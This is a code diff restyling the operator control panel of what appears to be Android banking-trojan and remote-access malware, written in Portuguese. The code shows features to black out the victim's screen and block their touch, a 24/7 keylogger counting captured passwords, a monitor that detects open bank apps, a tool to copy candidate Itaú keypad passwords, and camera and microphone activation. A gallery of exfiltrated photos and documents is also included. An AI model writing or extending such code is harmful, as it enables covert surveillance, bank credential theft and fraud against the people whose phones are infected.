-                <span className="text-[9px] font-mono text-cyan-400 font-bold bg-cyan-950 px-2 py-0.5 rounded border border-cyan-800/40">
-                  {isBlackScreen ? '🔴 ATIVA' : `⚪ ${t('black.disabled')}`}
+                <span className="text-[9px] font-mono text-[#ef4444] font-bold bg-[#121214] px-2 py-0.5 rounded border border-[#24242a]/40">
+                  {isBlackScreen ? ' ATIVA' : ` ${t('black.disabled')}`}
                 </span>
               </div>
 
@@ -8849,34 +8913,34 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-black-screen']}
                   onStyleChange={(style) => updateButtonStyle('btn-black-screen', style)}
-                  className={`flex-1 py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
+                  className={`flex-1 py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                     isBlackScreen
-                      ? 'bg-gradient-to-r from-red-600 via-rose-600 to-orange-600 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]'
-                      : 'bg-[#330b04] border border-orange-500/40 text-orange-300 hover:bg-orange-950/30'
+                      ? 'bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#84cc16] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)]'
+                      : 'bg-[#330b04] border border-[#ef4444]/40 text-[#fca5a5] hover:bg-orange-950/30'
                   }`}
                 >
-                  {isBlackScreen ? '🔴 Desativar Tela Preta' : t('black.enable')}
+                  {isBlackScreen ? ' Desativar Tela Preta' : t('black.enable')}
                 </EditableButton>
                 <button
                   onClick={() => setShowBlackScreenEditor(true)}
-                  className="px-3.5 py-2.5 bg-[#330b04] border border-blue-500/30 text-slate-200 rounded-xl hover:bg-[#501006] hover:border-cyan-400 transition-all text-xs font-bold"
+                  className="px-3.5 py-2.5 bg-[#330b04] border border-[#2a2a31]/30 text-slate-200 rounded-md hover:bg-[#501006] hover:border-[#3a3a44] transition-all text-xs font-bold"
                   title="Personalizar visual da tela preta / Fake Screen"
                 >
-                  🎨
+                  
                 </button>
               </div>
 
               {customBlackScreenTemplate && (
-                <p className="text-[10px] text-cyan-400 mt-2 font-mono bg-cyan-950/40 p-1.5 rounded border border-cyan-800/30">
-                  📋 Template Ativo: <span className="font-bold text-cyan-200">{customBlackScreenTemplate.name}</span>
+                <p className="text-[10px] text-[#ef4444] mt-2 font-mono bg-[#121214]/40 p-1.5 rounded border border-[#24242a]/30">
+                   Template Ativo: <span className="font-bold text-[#e8e8ea]">{customBlackScreenTemplate.name}</span>
                 </p>
               )}
 
               {isBlackScreen && (
-                <div className="flex flex-col gap-2 p-3 bg-[#180503]/90 rounded-xl mt-3 border border-red-500/30">
+                <div className="flex flex-col gap-2 p-3 bg-[#180503]/90 rounded-md mt-3 border border-[#2a2a31]/30">
                   <div className="flex justify-between text-[10px] text-slate-300 font-mono">
                     <span>Opacidade para a Vítima</span>
-                    <span className="text-cyan-300 font-bold">{blackScreenOpacity}%</span>
+                    <span className="text-[#ef4444] font-bold">{blackScreenOpacity}%</span>
                   </div>
                   <input
                     type="range"
@@ -8884,13 +8948,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     max={100}
                     value={blackScreenOpacity}
                     onChange={(e) => handleBlackScreenOpacityChange(parseInt(e.target.value, 10))}
-                    className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-cyan-400"
+                    className="w-full h-1.5 bg-[#24242a] rounded-md appearance-none cursor-pointer accent-[#ef4444]"
                   />
-                  <div className="flex items-center justify-between mt-2 pt-2 border-t border-slate-800">
+                  <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#24242a]">
                     <div className="flex flex-col">
                       <span className="text-[11px] text-slate-200 font-bold font-mono">Bloquear Toque (Vítima)</span>
                       <span className="text-[9px] text-slate-400 font-mono">
-                        {isBlackTouchBlocked ? '🔒 Vítima não consegue tocar' : '🔓 Toque livre na tela'}
+                        {isBlackTouchBlocked ? ' Vítima não consegue tocar' : ' Toque livre na tela'}
                       </span>
                     </div>
                     <button
@@ -8898,8 +8962,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       onClick={toggleBlackScreenTouch}
                       className={`relative w-11 h-6 rounded-full transition-all duration-300 ${
                         isBlackTouchBlocked
-                          ? 'bg-gradient-to-r from-red-600 to-orange-500 shadow-[0_0_10px_rgba(239,68,68,0.5)]'
-                          : 'bg-[#451208] border border-slate-700'
+                          ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.5)]'
+                          : 'bg-[#451208] border border-[#2a2a31]'
                       }`}
                     >
                       <span className={`absolute top-1 w-4 h-4 bg-white rounded-full shadow transition-all duration-300 ${
@@ -8911,8 +8975,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               )}
             </div>
 
-            {/* ⌨️ KEYLOGGER 24/7 VIP */}
-            <div id="tour-keylogger" className="bg-[#280903]/90 border border-amber-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
+            {/* ️ KEYLOGGER 24/7 VIP */}
+            <div id="tour-keylogger" className="bg-[#280903]/90 border border-amber-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
               <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-amber-400/50 to-transparent"></div>
               
               <div className="flex items-center justify-between mb-3">
@@ -8929,22 +8993,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               {/* Resumo Rápido em Stat Cards */}
               {keylogSummary && (
                 <div className="grid grid-cols-3 gap-2 mb-3">
-                  <div className="bg-[#170503] border border-amber-500/30 rounded-xl p-2 text-center">
+                  <div className="bg-[#170503] border border-amber-500/30 rounded-md p-2 text-center">
                     <div className="text-base font-black text-amber-400 font-mono">{keylogSummary.total_logs || 0}</div>
                     <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.total')}</div>
                   </div>
-                  <div className="bg-[#170503] border border-emerald-500/30 rounded-xl p-2 text-center">
+                  <div className="bg-[#170503] border border-emerald-500/30 rounded-md p-2 text-center">
                     <div className="text-base font-black text-emerald-400 font-mono">{keylogSummary.today_logs || 0}</div>
                     <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.today')}</div>
                   </div>
-                  <div className="bg-[#170503] border border-rose-500/30 rounded-xl p-2 text-center">
+                  <div className="bg-[#170503] border border-[#ef4444]/30 rounded-md p-2 text-center">
                     <div className="text-base font-black text-rose-400 font-mono">{keylogSummary.passwords_captured || 0}</div>
                     <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.passwords')}</div>
                   </div>
                 </div>
               )}
               
-              {/* 🎥 CÂMERA & MICROFONE */}
+              {/*  CÂMERA & MICROFONE */}
               <div className="grid grid-cols-2 gap-2 mb-3">
                 <EditableButton
                   id="btn-camera"
@@ -8952,13 +9016,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-camera']}
                   onStyleChange={(style) => updateButtonStyle('btn-camera', style)}
-                  className={`py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
+                  className={`py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                     isCameraEnabled
                       ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_12px_rgba(16,185,129,0.4)] border-none'
-                      : 'bg-[#330b04] border border-blue-500/30 text-cyan-300 hover:bg-[#501006]'
+                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#501006]'
                   }`}
                 >
-                  <Camera className="w-4 h-4 text-cyan-300" />
+                  <Camera className="w-4 h-4 text-[#ef4444]" />
                   {isCameraEnabled ? `${t('device.camera')} ON` : t('device.camera')}
                 </EditableButton>
                 <EditableButton
@@ -8967,35 +9031,35 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-microphone']}
                   onStyleChange={(style) => updateButtonStyle('btn-microphone', style)}
-                  className={`py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
+                  className={`py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                     isMicrophoneEnabled
                       ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_12px_rgba(16,185,129,0.4)] border-none'
-                      : 'bg-[#330b04] border border-blue-500/30 text-cyan-300 hover:bg-[#501006]'
+                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#501006]'
                   }`}
                 >
-                  <Mic className="w-4 h-4 text-cyan-300" />
+                  <Mic className="w-4 h-4 text-[#ef4444]" />
                   {isMicrophoneEnabled ? `${t('device.mic')} ON` : t('device.mic')}
                 </EditableButton>
               </div>
 
               {/*  MONITOR BANCRIO */}
-              <div className="bg-[#280903]/90 border border-orange-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-orange-400/50 relative overflow-hidden group mb-3">
-                <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-orange-400/50 to-transparent"></div>
+              <div className="bg-[#280903]/90 border border-[#ef4444]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#f87171]/50 relative overflow-hidden group mb-3">
+                <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
                 
                 <div className="flex items-center justify-between mb-3">
-                  <h3 className="text-orange-400 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
+                  <h3 className="text-[#f87171] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                     <span className="text-base"></span>
                     {t('device.bank_vip')}
                   </h3>
-                  <span className="px-2 py-0.5 bg-orange-950/60 border border-orange-500/40 text-orange-300 text-[10px] font-mono rounded-full font-bold">
+                  <span className="px-2 py-0.5 bg-orange-950/60 border border-[#ef4444]/40 text-[#fca5a5] text-[10px] font-mono rounded-full font-bold">
                     {installedBanks.length} {t('device.bank_apps')}
                   </span>
                 </div>
                 
-                <div className="text-[11px] text-slate-300 mb-3 font-mono bg-[#170503] p-2 rounded-xl border border-orange-500/20 flex justify-around">
+                <div className="text-[11px] text-slate-300 mb-3 font-mono bg-[#170503] p-2 rounded-md border border-[#ef4444]/20 flex justify-around">
                   <span>{t('device.balances')}: <span className="text-emerald-400 font-black">{bankBalances.length}</span></span>
-                  <span className="text-slate-600">|</span>
-                  <span>{t('device.stats.passwords')}: <span className="text-orange-400 font-black">{bankPasswords.length}</span></span>
+                  <span className="text-[#6f6f78]">|</span>
+                  <span>{t('device.stats.passwords')}: <span className="text-[#f87171] font-black">{bankPasswords.length}</span></span>
                 </div>
 
                 {screenHierarchy?.package && (
@@ -9004,9 +9068,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     const isOpen = keywords.some(k => screenHierarchy.package.toLowerCase().includes(k));
                     if (isOpen) {
                       return (
-                        <div className="mb-3 p-2 bg-red-950/40 border border-red-500/50 rounded-xl flex items-center justify-between animate-pulse">
-                          <span className="text-[10px] font-black text-red-400 flex items-center gap-1">
-                            <ShieldAlert className="w-3.5 h-3.5 text-red-400" />
+                        <div className="mb-3 p-2 bg-[#121214]/40 border border-[#2a2a31]/50 rounded-md flex items-center justify-between animate-pulse">
+                          <span className="text-[10px] font-black text-[#ef4444] flex items-center gap-1">
+                            <ShieldAlert className="w-3.5 h-3.5 text-[#ef4444]" />
                             BANCO EM FOCO DETECTADO
                           </span>
                           <span className="text-[9px] text-white font-mono truncate max-w-[120px]">{screenHierarchy.package.split('.').pop()}</span>
@@ -9022,7 +9086,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth' });
                     setShowBankMonitorTab(true);
                   }} 
-                  className="w-full py-2 bg-gradient-to-r from-orange-600/15 to-red-650/15 border border-orange-500/35 hover:border-orange-400 hover:from-orange-600/25 hover:to-red-650/25 text-orange-400 rounded-lg font-bold text-xs uppercase tracking-wider transition-all"
+                  className="w-full py-2 bg-gradient-to-r from-[#84cc16]/15 to-red-650/15 border border-[#ef4444]/35 hover:border-[#f87171] hover:from-[#84cc16]/25 hover:to-red-650/25 text-[#f87171] rounded-md font-bold text-xs uppercase tracking-wider transition-all"
                 >
                   {t('device.open_bank_center')}
                 </button>
@@ -9038,20 +9102,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     keylogger: { ...prev.keylogger, open: true }
                   }));
                 }} 
-                className="w-full py-2.5 bg-gradient-to-r from-amber-600/20 via-orange-600/20 to-amber-700/20 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-xl font-black text-xs uppercase tracking-wider transition-all sandbox-btn flex items-center justify-center gap-2"
+                className="w-full py-2.5 bg-gradient-to-r from-amber-600/20 via-[#84cc16]/20 to-amber-700/20 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-md font-black text-xs uppercase tracking-wider transition-all sandbox-btn flex items-center justify-center gap-2"
               >
                 {t('device.open_history')}
               </button>
               
               {/* Feed dos Últimos Eventos */}
-              <div className="mt-3.5 bg-[#180503] border border-cyan-500/30 shadow-[0_0_15px_rgba(239,68,68,0.1)] rounded-xl p-3">
-                <div className="flex items-center justify-between mb-3 pb-2 border-b border-cyan-500/25">
-                  <h4 className="text-xs font-black text-cyan-300 uppercase font-mono tracking-wider flex items-center gap-2">
+              <div className="mt-3.5 bg-[#180503] border border-[#2a2a31]/30 shadow-[0_0_15px_rgba(239,68,68,0.1)] rounded-md p-3">
+                <div className="flex items-center justify-between mb-3 pb-2 border-b border-[#2a2a31]/25">
+                  <h4 className="text-xs font-black text-[#ef4444] uppercase font-mono tracking-wider flex items-center gap-2">
                     <span className="w-2.5 h-2.5 bg-emerald-400 rounded-full animate-ping shadow-[0_0_8px_#34d399]" />
                     Últimos Eventos Capturados
                   </h4>
                   <div className="flex items-center gap-2">
-                    <span className="text-[10px] font-mono font-bold bg-cyan-950/80 text-cyan-300 px-2.5 py-0.5 rounded-full border border-cyan-500/40 shadow-sm">
+                    <span className="text-[10px] font-mono font-bold bg-[#121214]/80 text-[#ef4444] px-2.5 py-0.5 rounded-full border border-[#2a2a31]/40 shadow-sm">
                       {keylogsByDate.length} eventos
                     </span>
                   </div>
@@ -9099,7 +9163,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     }
 
                     // 1. Logs de senhas customizadas formatadas com íícone
-                    if (textVal.startsWith('🔑')) {
+                    if (textVal.startsWith('')) {
                       return textVal;
                     }
 
@@ -9107,22 +9171,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     if (l.isPassword || eventType.includes('PIN') || eventType.includes('PASSWORD') || eventType.includes('KEYPAD') || eventType.includes('DIGIT') || eventType.includes('REALTIME')) {
                       const cleanNum = textVal.replace(/[\[\]]/g, '').trim();
                       const cleanLower = cleanNum.toLowerCase();
-                      if (cleanNum && cleanLower !== 'ispassword' && cleanLower !== 'true' && cleanLower !== 'false' && cleanLower !== 'null' && cleanLower !== 'undefined' && cleanNum !== '🔑') {
-                        return `🔑 Senha / Dígito: ${cleanNum}`;
+                      if (cleanNum && cleanLower !== 'ispassword' && cleanLower !== 'true' && cleanLower !== 'false' && cleanLower !== 'null' && cleanLower !== 'undefined' && cleanNum !== '') {
+                        return ` Senha / Dígito: ${cleanNum}`;
                       }
                       const label = hint || fieldName || (l && (l.appName || l.bank)) || '';
-                      return label ? `🔑 Digitando Senha em (${label})` : `🔑 Senha sendo digitada...`;
+                      return label ? ` Digitando Senha em (${label})` : ` Senha sendo digitada...`;
                     }
 
                     // 3. Cliques e toques em botões
                     if (eventType.includes('CLICK') || eventType.includes('BUTTON') || eventType.includes('TOUCH') || textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                       if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                         const clean = textVal.replace(/^"|"$/g, '');
-                        return `👆 Clique: "${clean}"`;
+                        return ` Clique: "${clean}"`;
                       }
                       const posMatch = textVal.match(/pos\((\d+),(\d+)\)|BTN:(\d+),(\d+)/);
                       const posInfo = posMatch ? ` (x:${posMatch[1] || posMatch[3]}, y:${posMatch[2] || posMatch[4]})` : '';
-                      return `👆 Toque na Tela${posInfo}`;
+                      return ` Toque na Tela${posInfo}`;
                     }
 
                     // 4. Digitação de texto normal
@@ -9146,8 +9210,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       return textVal;
                     }
 
-                    if (hint) return `💡 ${hint}`;
-                    if (fieldName) return `📌 ${fieldName}`;
+                    if (hint) return ` ${hint}`;
+                    if (fieldName) return ` ${fieldName}`;
                     if (appName) return ` ${appName}`;
                     return ' Ação no Aplicativo';
                   };
@@ -9156,14 +9220,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                   if (cleanSidebarLogs.length === 0) {
                     return (
-                      <div className="text-center py-6 text-slate-500 text-xs font-mono bg-slate-950/40 rounded-xl border border-slate-900">
+                      <div className="text-center py-6 text-[#8b8b94] text-xs font-mono bg-slate-950/40 rounded-md border border-[#121214]">
                         Nenhum evento capturado hoje ainda
                       </div>
                     );
                   }
 
                   return (
-                    <div className="max-h-80 overflow-y-auto space-y-2 pr-1 scrollbar-thin scrollbar-thumb-cyan-500/30 scrollbar-track-transparent">
+                    <div className="max-h-80 overflow-y-auto space-y-2 pr-1 scrollbar-thin scrollbar-thumb-[#3a3a44]/30 scrollbar-track-transparent">
                       {cleanSidebarLogs.slice(-20).reverse().map((log, i) => {
                         const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
                         const logTime = log.time || new Date(log.timestamp || log.created_at).toLocaleTimeString('pt-BR');
@@ -9187,64 +9251,64 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           }
                         }
 
-                        const isClick = textDisplay.startsWith('👆');
-                        const isPass = log.isPassword || textDisplay.startsWith('🔑');
+                        const isClick = textDisplay.startsWith('');
+                        const isPass = log.isPassword || textDisplay.startsWith('');
                         const isScreen = textDisplay.startsWith('');
                         const isText = textDisplay.startsWith('¨');
 
                         return (
                           <div 
                             key={i} 
-                            className={`group p-2.5 rounded-xl transition-all border shadow-sm ${
+                            className={`group p-2.5 rounded-md transition-all border shadow-sm ${
                               isPass 
-                                ? 'bg-gradient-to-r from-rose-950/60 via-red-950/40 to-slate-950/80 border-rose-500/60 shadow-[0_0_15px_rgba(244,63,94,0.2)] hover:border-rose-400' 
+                                ? 'bg-gradient-to-r from-rose-950/60 via-[#121214]/40 to-slate-950/80 border-[#ef4444]/60 shadow-[0_0_15px_rgba(244,63,94,0.2)] hover:border-rose-400' 
                                 : isClick 
-                                  ? 'bg-gradient-to-r from-purple-950/40 to-slate-950/80 border-purple-500/40 hover:border-purple-400' 
+                                  ? 'bg-gradient-to-r from-purple-950/40 to-slate-950/80 border-[#f87171]/40 hover:border-[#f87171]' 
                                   : isScreen 
-                                    ? 'bg-gradient-to-r from-cyan-950/30 to-slate-950/80 border-cyan-500/30 hover:border-cyan-400' 
+                                    ? 'bg-gradient-to-r from-[#121214]/30 to-slate-950/80 border-[#2a2a31]/30 hover:border-[#3a3a44]' 
                                     : isText
                                       ? 'bg-gradient-to-r from-emerald-950/30 to-slate-950/80 border-emerald-500/30 hover:border-emerald-400'
-                                      : 'bg-slate-950/70 border-slate-800 hover:border-cyan-500/40'
+                                      : 'bg-slate-950/70 border-[#24242a] hover:border-[#2a2a31]/40'
                             }`}
                           >
                             <div className="flex items-center justify-between gap-2 mb-1.5">
                               <div className="flex items-center space-x-2 min-w-0">
                                 <BankIcon pkg={log.package || ''} iconB64={log.icon || log.iconB64} name={friendlyName} size={22} />
-                                <span className="text-[10px] font-mono font-bold text-cyan-300 truncate max-w-[130px] bg-cyan-950/60 px-2 py-0.5 rounded-md border border-cyan-800/40">
+                                <span className="text-[10px] font-mono font-bold text-[#ef4444] truncate max-w-[130px] bg-[#121214]/60 px-2 py-0.5 rounded-md border border-[#24242a]/40">
                                   {friendlyName}
                                 </span>
                               </div>
                               <span className="text-[10px] font-mono font-bold text-amber-300 bg-amber-950/60 px-2 py-0.5 rounded-md border border-amber-500/30 flex-shrink-0">
-                                🕒 {logTime}
+                                 {logTime}
                               </span>
                             </div>
                             
                             <div className="flex flex-col gap-1 mt-1">
                               {isItauKeypadSidebar ? (
                                 <div className="space-y-1">
-                                  <div className="text-[10px] font-mono font-bold text-orange-400 flex items-center gap-1">
-                                    <span>🔥 Teclas🏦 Itaú</span>
-                                    <span className="text-[9px] text-orange-300/80">({sidebarItauPerms.length} senhas)</span>
+                                  <div className="text-[10px] font-mono font-bold text-[#f87171] flex items-center gap-1">
+                                    <span> Teclas Itaú</span>
+                                    <span className="text-[9px] text-[#fca5a5]/80">({sidebarItauPerms.length} senhas)</span>
                                   </div>
-                                  <p className="font-mono text-xs font-bold text-orange-200 break-all leading-snug bg-orange-950/40 p-2 rounded-lg border border-orange-500/30">
+                                  <p className="font-mono text-xs font-bold text-orange-200 break-all leading-snug bg-orange-950/40 p-2 rounded-md border border-[#ef4444]/30">
                                     {textDisplay}
                                   </p>
                                   {sidebarItauPerms.length > 0 && (
                                     <button
                                       onClick={() => {
                                         navigator.clipboard.writeText(sidebarItauPerms.join('\n'));
-                                        addLog(`📋 Copiado ${sidebarItauPerms.length} combinações de senha🏦 Itaú!`);
+                                        addLog(` Copiado ${sidebarItauPerms.length} combinações de senha Itaú!`);
                                       }}
-                                      className="w-full py-1 bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-black font-black text-[9px] font-mono rounded-lg shadow transition-all uppercase tracking-wider"
+                                      className="w-full py-1 bg-gradient-to-r from-[#ef4444] to-amber-500 hover:from-[#f87171] hover:to-amber-400 text-black font-black text-[9px] font-mono rounded-md shadow transition-all uppercase tracking-wider"
                                     >
-                                      📋 Copiar {sidebarItauPerms.length} Senhas Possíveis
+                                       Copiar {sidebarItauPerms.length} Senhas Possíveis
                                     </button>
                                   )}
                                 </div>
                               ) : (
                                 <div className="flex items-center justify-between gap-2">
                                   <p className={`font-mono text-xs font-bold break-all leading-snug ${
-                                    isPass ? 'text-rose-200' : isClick ? 'text-purple-200' : isScreen ? 'text-cyan-200' : isText ? 'text-emerald-200' : 'text-slate-100'
+                                    isPass ? 'text-rose-200' : isClick ? 'text-purple-200' : isScreen ? 'text-[#e8e8ea]' : isText ? 'text-emerald-200' : 'text-slate-100'
                                   }`}>
                                     {textDisplay}
                                   </p>
@@ -9252,9 +9316,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   <button
                                     onClick={() => {
                                       navigator.clipboard.writeText(textDisplay);
-                                      addLog(`📋 Copiado: ${textDisplay}`);
+                                      addLog(` Copiado: ${textDisplay}`);
                                     }}
-                                    className="text-[9px] bg-slate-900 hover:bg-cyan-950 text-slate-300 hover:text-cyan-300 px-2 py-1 rounded-md border border-slate-700 font-mono font-bold transition-all flex-shrink-0 shadow-sm"
+                                    className="text-[9px] bg-[#121214] hover:bg-[#121214] text-slate-300 hover:text-[#ef4444] px-2 py-1 rounded-md border border-[#2a2a31] font-mono font-bold transition-all flex-shrink-0 shadow-sm"
                                   >
                                     Copiar
                                   </button>
@@ -9271,7 +9335,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             </div>
             
             {/* ARQUIVOS RECEBIDOS */}
-            <div className="bg-[#280904]/85 border border-emerald-500/20 shadow-[0_4px_25px_rgba(0,0,0,0.4)] rounded-2xl p-5 transition-all hover:border-emerald-500/40 relative overflow-hidden group">
+            <div className="bg-[#280904]/85 border border-emerald-500/20 shadow-[0_4px_25px_rgba(0,0,0,0.4)] rounded-md p-5 transition-all hover:border-emerald-500/40 relative overflow-hidden group">
               <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-emerald-500/35 to-transparent"></div>
               
               <div className="flex items-center justify-between mb-4 pb-2 border-b border-emerald-500/10">
@@ -9285,13 +9349,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 
                 {/* Botões de Visualização Grid/Lista */}
                 {uploadedFiles.length > 0 && (
-                  <div className="flex items-center gap-1 bg-[#200703] border border-slate-800 rounded-lg p-0.5 shadow-inner">
+                  <div className="flex items-center gap-1 bg-[#200703] border border-[#24242a] rounded-md p-0.5 shadow-inner">
                     <button
                       onClick={() => setFilesViewMode('grid')}
                       className={`p-1.5 rounded transition-all duration-200 ${
                         filesViewMode === 'grid'
                           ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/20'
-                          : 'text-slate-500 hover:text-slate-300'
+                          : 'text-[#8b8b94] hover:text-slate-300'
                       }`}
                       title="Visualizar em Grid"
                     >
@@ -9302,7 +9366,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       className={`p-1.5 rounded transition-all duration-200 ${
                         filesViewMode === 'list'
                           ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/20'
-                          : 'text-slate-500 hover:text-slate-300'
+                          : 'text-[#8b8b94] hover:text-slate-300'
                       }`}
                       title="Visualizar em Lista"
                     >
@@ -9313,10 +9377,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
 
               {uploadedFiles.length === 0 ? (
-                <div className="text-center py-8 text-slate-500 border border-dashed border-emerald-500/20 rounded-xl bg-[#200703]/45 font-mono shadow-inner">
-                  <div className="text-3xl mb-2 animate-pulse">“</div>
+                <div className="text-center py-8 text-[#8b8b94] border border-dashed border-emerald-500/20 rounded-md bg-[#200703]/45 font-mono shadow-inner">
+                  <div className="text-3xl mb-2 animate-pulse"></div>
                   <p className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Aguardando arquivos</p>
-                  <p className="text-[9px] text-slate-600 mt-1">Fotos, PDFs e Documentos capturados aparecerão aqui</p>
+                  <p className="text-[9px] text-[#6f6f78] mt-1">Fotos, PDFs e Documentos capturados aparecerão aqui</p>
                 </div>
               ) : filesViewMode === 'grid' ? (
                 /* MODO GRID (GALERIA) */
@@ -9328,10 +9392,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     return (
                       <div
                         key={i}
-                        className="group/card relative bg-gradient-to-b from-slate-900/90 to-[#300b04]/90 border border-emerald-500/15 hover:border-emerald-500/40 rounded-xl p-2.5 transition-all duration-300 shadow-md hover:shadow-[0_4px_15px_rgba(16,185,129,0.1)] flex flex-col justify-between overflow-hidden"
+                        className="group/card relative bg-gradient-to-b from-[#121214]/90 to-[#300b04]/90 border border-emerald-500/15 hover:border-emerald-500/40 rounded-md p-2.5 transition-all duration-300 shadow-md hover:shadow-[0_4px_15px_rgba(16,185,129,0.1)] flex flex-col justify-between overflow-hidden"
                       >
                         {/* Imagem ou Iícone */}
-                        <div className="relative aspect-video w-full rounded-lg bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center mb-2 shadow-inner group/preview">
+                        <div className="relative aspect-video w-full rounded-md bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center mb-2 shadow-inner group/preview">
                           {isImg && file.data ? (
                             <>
                               <img
@@ -9346,7 +9410,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     setLightboxImage(`data:${file.mimeType};base64,${file.data}`);
                                     setLightboxName(file.fileName || 'Imagem');
                                   }}
-                                  className="p-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 rounded-lg shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300"
+                                  className="p-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 rounded-md shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300"
                                   title="Ver em Tela Cheia"
                                 >
                                   <Eye className="w-3.5 h-3.5 font-bold" />
@@ -9358,7 +9422,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     link.download = file.fileName || 'imagem.jpg';
                                     link.click();
                                   }}
-                                  className="p-1.5 bg-slate-800 hover:bg-slate-700 text-white rounded-lg shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300 delay-75"
+                                  className="p-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-white rounded-md shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300 delay-75"
                                   title="Baixar"
                                 >
                                   <Download className="w-3.5 h-3.5" />
@@ -9368,9 +9432,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           ) : (
                             <div className="flex flex-col items-center justify-center p-3 text-center">
                               <span className="text-3xl mb-1 filter drop-shadow-[0_2px_8px_rgba(16,185,129,0.2)]">
-                                {isPdf ? '“„' : '“'}
+                                {isPdf ? '' : ''}
                               </span>
-                              <span className="text-[8px] font-bold font-mono text-slate-500 uppercase tracking-wider">
+                              <span className="text-[8px] font-bold font-mono text-[#8b8b94] uppercase tracking-wider">
                                 {isPdf ? 'PDF Document' : 'Documento'}
                               </span>
                             </div>
@@ -9386,7 +9450,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
